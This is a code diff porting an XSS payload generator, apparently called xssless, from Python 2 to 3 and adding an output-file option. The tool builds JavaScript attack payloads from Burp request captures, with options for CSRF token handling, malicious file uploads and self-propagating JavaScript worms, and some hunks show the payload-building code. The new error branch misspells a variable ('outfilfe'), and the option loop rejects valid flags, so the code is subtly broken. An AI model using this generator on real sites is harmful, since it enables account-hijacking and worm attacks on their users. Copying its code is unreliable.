@@ -45,7 +45,7 @@ def payload_encode_input(filecontents):
 
 # Get a list of headers for request/response
 def parse_request(input_var, url):
-    
+
     # Set flags for later interpretation (ie, POST is actually JSON data, etc)
     flags = []
 
@@ -98,7 +98,7 @@ def parse_request(input_var, url):
     # If the form is multipart the rules change, set values accordingly and pass it one
     if postisupload:
         postpartsList = body_data.split(fileboundary)
-        
+
         # FF adds a bunch of '-' characters, so we'll filter out anything without a Content-Disposition in it
         for key, value in enumerate(postpartsList):
             if 'Content-Disposition' not in value:
@@ -138,7 +138,7 @@ def parse_request(input_var, url):
                 bodyList.append(bodyDict)
             except ValueError:
                 pass
-        
+
     # Returned dict, chocked full of useful information formatted nicely for your convienience!
     returnDict = {}
     returnDict['method'] = rtypeList[0] # Method being used (POST, GET, PUT, DELETE, HEAD)
@@ -249,7 +249,7 @@ def xss_gen(requestList, settingsDict):
                 http.setRequestHeader('Content-length', body.length);
                 http.setRequestHeader('Connection', 'close');
                 http.sendAsBinary(body);
-                    
+
             }
 """
 
@@ -354,7 +354,6 @@ def xss_gen(requestList, settingsDict):
         elif requestDict['method'].lower() == "head":
             head_flag = True
             payload += "        doRequest('" + requestDict['path'] + "', 'HEAD', '');\n"
-            pass
 
         payload += "    }\n"
         payload += "\n"
@@ -363,7 +362,7 @@ def xss_gen(requestList, settingsDict):
 
     # Now add only the needed code for this particular payload
     func_code = ""
-    
+
     if settingsDict['opt']:
         if mpost_flag:
             func_code += mpost_js
@@ -399,18 +398,21 @@ Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]
 -p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set.
 -f=FILELIST      File list - input list of POST name/filenames to use in payload. ex: 'upload_filename,~/Desktop/shell.bin'
 -m=METALIST      Self propagation list - input list of POST names for POSTing the XSS payload itself (for JavaScript worms)
+-o=OUTFILE       Write payload to file rather than stdout
 -s               Don't display the xssless logo
 -n               Turn off payload optimization
 
 """
-if __name__ == '__main__':
+def main():
     if len(sys.argv) < 2:
-        print logo
-        print helpmenu
+        print(logo)
+        print(helpmenu)
     else:
         # settingsDict will contain code generation settings, such as waiting for each request to complete, etc.
         settingsDict = {}
         settingsDict['opt'] = True
+        
+        outfile = None
 
         showlogo = False if "-s" in sys.argv[1:] else True # quick check for this first incase they hate logos
 
@@ -419,58 +421,65 @@ if __name__ == '__main__':
                 continue
             if option == "-h":
                 if showlogo:
-                    print logo
-                print helpmenu
+                    print(logo)
+                print(helpmenu)
                 sys.exit(0)
             if "-m=" in option:
                 metafile = option.replace("-m=", "")
                 if os.path.isfile(metafile):
-                    tmpList = open(metafile).readlines()
+                    with open(metafile, 'r') as f:
+                        tmpList = f.readlines()
                     for key,value in enumerate(tmpList):
                         tmpList[key] = value.replace("\n", "")
                     if len(tmpList):
                         settingsDict['metaList'] = tmpList
                 else:
-                    print "Error, meta list not found!"
+                    print("Error, meta list not found!")
+                    sys.exit(1)
             if "-p=" in option:
                 parsefile = option.replace("-p=", "")
                 if os.path.isfile(parsefile):
-                   tmpList = open(parsefile).readlines()
-                   for key,value in enumerate(tmpList):
-                       tmpList[key] = value.replace("\n", "")
-                   if len(tmpList):
-                       settingsDict['parseList'] = tmpList
+                    with open(parsefile, 'r') as f:
+                        tmpList = f.readlines()
+                    for key,value in enumerate(tmpList):
+                        tmpList[key] = value.replace("\n", "")
+                    if len(tmpList):
+                        settingsDict['parseList'] = tmpList
                 else:
-                    print "Error, parse list not found!"
+                    print("Error, parse list not found!")
+                    sys.exit(1)
             if "-n" in option:
                 settingsDict['opt'] = False
+            if "-o=" in option:
+                outfile = option.replace("-o=", "")
             if "-f=" in option:
                 fileuploadlist = option.replace("-f=", "")
                 if os.path.isfile(fileuploadlist):
                     tmpDict = {}
-                    fileuploadlinesList = open(fileuploadlist).readlines()
+                    with open(fileuploadlist, 'r') as f:
+                        fileuploadlinesList = f.readlines()
                     for key, value in enumerate(fileuploadlinesList):
                         rowparts = value.replace("\n", "").split(",", 1)
                         if len(rowparts) == 2:
                             if os.path.isfile(rowparts[1]):
                                 tmpDict[rowparts[0]] = rowparts[1]
                             else:
-                                print "File '" + rowparts[1] + "' not found!"
+                                print("File '" + rowparts[1] + "' not found!")
                                 sys.exit(1)
                         else:
-                            print "Error while parsing file " + fileuploadlist + " on line #" + str(key)
-                            print "    ->'" + value.replace("\n", "") + "'"
+                            print("Error while parsing file " + fileuploadlist + " on line #" + str(key))
+                            print("    ->'" + value.replace("\n", "") + "'")
                             sys.exit(1)
                     if tmpDict:
                         settingsDict['fileDict'] = tmpDict
                 else:
-                    print "Input filelist not found!"
+                    print("Input filelist not found!")
                     sys.exit(1)
             else:
-                print "Option " + option + " not recognized."
+                print("Option '" + option + "' not recognized.")
                 if showlogo:
-                    print logo
-                print helpmenu
+                    print(logo)
+                print(helpmenu)
                 sys.exit(1)
 
         if os.path.exists(sys.argv[-1]):
@@ -479,11 +488,23 @@ if __name__ == '__main__':
             inputfile = ""
 
         if showlogo:
-            print logo
+            print(logo)
 
         if inputfile:
             requestList = get_burp_list(inputfile)
-            print xss_gen(requestList, settingsDict)
+            payload = xss_gen(requestList, settingsDict)
+            if outfile:
+                try:
+                    with open(outfile, 'w') as f:
+                        f.write(payload)
+                except:
+                    print("Couldn't open file '" + outfilfe + "' for writing.")
+                    sys.exit(1)
+            else:
+                print(payload)
         else:
-            print "Error while processing Burp export, please ensure the file exists!"
+            print("Error while processing Burp export, please ensure the file exists!")
             sys.exit(1)
+
+if __name__ == '__main__':
+    main()
